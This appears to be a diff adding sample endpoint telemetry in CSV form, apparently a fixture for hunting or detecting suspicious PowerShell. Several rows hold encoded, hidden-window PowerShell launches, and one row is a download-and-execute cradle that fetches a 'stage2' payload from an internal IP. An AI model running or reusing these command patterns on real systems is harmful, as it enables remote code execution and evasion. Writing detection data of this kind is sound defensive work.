@@ -1,0 +1,6 @@
+Timestamp,DeviceName,AccountName,ProcessCommandLine,InitiatingProcessFileName
+Apr 17 2026 09:15:00,wks-18.corp.example.com,liam.osei,powershell.exe -enc dABoAGkAcwAgAGkAcwAgAGEAIAB0AGUAcwB0,outlook.exe
+Apr 17 2026 14:22:00,wks-06.corp.example.com,kira.svensson,powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0,wscript.exe
+Apr 17 2026 22:41:00,srv-05.corp.example.com,administrator,powershell -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBj,cmd.exe
+Apr 18 2026 02:05:00,wks-05.corp.example.com,hana.oyelaran,pwsh -encodedcommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAG4AZQB0AHMAdABhAHQALgBlAHgAZQ==,powershell.exe
+Apr 18 2026 03:18:00,opencti-0201,svc_automation,powershell.exe -NoProfile IEX (New-Object Net.WebClient).DownloadString('http://10.10.25.99/stage2'),explorer.exe
